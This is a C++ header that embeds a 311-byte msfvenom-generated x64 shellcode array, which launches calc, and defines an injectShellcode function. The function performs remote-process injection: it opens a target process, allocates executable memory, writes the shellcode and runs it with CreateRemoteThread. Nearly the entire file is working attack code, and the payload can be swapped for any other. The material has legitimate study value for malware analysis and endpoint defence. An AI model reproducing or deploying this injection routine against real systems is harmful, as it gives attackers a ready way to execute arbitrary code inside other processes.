#pragma once

#include <iostream>
#include <Windows.h>

/*
	popCalc64 is the 64 bit meterpreter payload generate by command - msfvenom -p windows/x64/exec CMD=calc -b "\x00"
	Payload length = 311 bytes.
*/

const char popCalc64[] = "\x48\x31\xc9\x48\x81\xe9\xde\xff\xff\xff\x48\x8d\x05\xef\xff"
"\xff\xff\x48\xbb\x86\x9d\x34\xad\x6a\x2d\x4b\x82\x48\x31\x58"
"\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\x7a\xd5\xb7\x49\x9a\xc5"
"\x8b\x82\x86\x9d\x75\xfc\x2b\x7d\x19\xd3\xd0\xd5\x05\x7f\x0f"
"\x65\xc0\xd0\xe6\xd5\xbf\xff\x72\x65\xc0\xd0\xa6\xd5\xbf\xdf"
"\x3a\x65\x44\x35\xcc\xd7\x79\x9c\xa3\x65\x7a\x42\x2a\xa1\x55"
"\xd1\x68\x01\x6b\xc3\x47\x54\x39\xec\x6b\xec\xa9\x6f\xd4\xdc"
"\x65\xe5\xe1\x7f\x6b\x09\xc4\xa1\x7c\xac\xba\xa6\xcb\x0a\x86"
"\x9d\x34\xe5\xef\xed\x3f\xe5\xce\x9c\xe4\xfd\xe1\x65\x53\xc6"
"\x0d\xdd\x14\xe4\x6b\xfd\xa8\xd4\xce\x62\xfd\xec\xe1\x19\xc3"
"\xca\x87\x4b\x79\x9c\xa3\x65\x7a\x42\x2a\xdc\xf5\x64\x67\x6c"
"\x4a\x43\xbe\x7d\x41\x5c\x26\x2e\x07\xa6\x8e\xd8\x0d\x7c\x1f"
"\xf5\x13\xc6\x0d\xdd\x10\xe4\x6b\xfd\x2d\xc3\x0d\x91\x7c\xe9"
"\xe1\x6d\x57\xcb\x87\x4d\x75\x26\x6e\xa5\x03\x83\x56\xdc\x6c"
"\xec\x32\x73\x12\xd8\xc7\xc5\x75\xf4\x2b\x77\x03\x01\x6a\xbd"
"\x75\xff\x95\xcd\x13\xc3\xdf\xc7\x7c\x26\x78\xc4\x1c\x7d\x79"
"\x62\x69\xe5\xd0\x2c\x4b\x82\x86\x9d\x34\xad\x6a\x65\xc6\x0f"
"\x87\x9c\x34\xad\x2b\x97\x7a\x09\xe9\x1a\xcb\x78\xd1\xdd\xfe"
"\x20\xd0\xdc\x8e\x0b\xff\x90\xd6\x7d\x53\xd5\xb7\x69\x42\x11"
"\x4d\xfe\x8c\x1d\xcf\x4d\x1f\x28\xf0\xc5\x95\xef\x5b\xc7\x6a"
"\x74\x0a\x0b\x5c\x62\xe1\xce\x0b\x41\x28\x82";

using namespace std;

VOID injectShellcode(DWORD dwPID) {

	BOOL	bWriteSuccess;
	DWORD	dwThreadId;
	HANDLE	hProcess;
	HANDLE	hRemoteThread;
	SIZE_T	numBytes;
	SIZE_T	payloadSize;
	LPVOID	lpRemoteMem;


	cout << "\t[*] Attempting to obtain handle on process with PID : " << dwPID << endl;

	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID);

	if (hProcess == INVALID_HANDLE_VALUE)
	{
		cerr << "\t\t[!] FAILED to obtain handle on remote process." << endl;
		return;
	}

	cout << hex;
	cout << "\t\t[+] Process opened with handle : 0x" << hProcess << endl;

	lpRemoteMem = nullptr;

	cout << "\t[*] Attempting to allocate memory for shellcode." << endl;

	lpRemoteMem = VirtualAllocEx(hProcess, nullptr, 1024, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	if (!lpRemoteMem)
	{
		cerr << "\t\t[!] FAILED to allocate memory in remote process." << endl;
		CloseHandle(hProcess);

		return;
	}

	cout << "\t\t[+] Memory allocated at : 0x" << lpRemoteMem << endl;

	cout << "\t[*] Attempting to write shellcode in remote process" << endl;

	payloadSize = sizeof(popCalc64);

	bWriteSuccess = WriteProcessMemory(hProcess, lpRemoteMem, popCalc64, payloadSize, &numBytes);

	if (!bWriteSuccess)
	{
		cerr << "\t\t[!] FAILED to write shellcode. Wrote " << numBytes << " bytes instead of " << payloadSize << " bytes." << endl;

		CloseHandle(hProcess);
		return;
	}

	cout << "\t\t[+] Wrote shellcode in remote process memory." << endl;

	cout << "\t[*] Creating a new thread to execute shellcode." << endl;

	hRemoteThread = CreateRemoteThread(hProcess, nullptr, 0, (LPTHREAD_START_ROUTINE)lpRemoteMem , nullptr, 0, &dwThreadId);

	if (!hRemoteThread)
	{
		cerr << "\t\t[!] FAILED to create thread." << endl;
		
		CloseHandle(hProcess);
		return;
	}

	cout << "\t\t[+] Thread created successfully with thread id: 0x" << dwThreadId << endl;

	WaitForSingleObject(hRemoteThread, INFINITE);

	CloseHandle(hRemoteThread);
	CloseHandle(hProcess);
}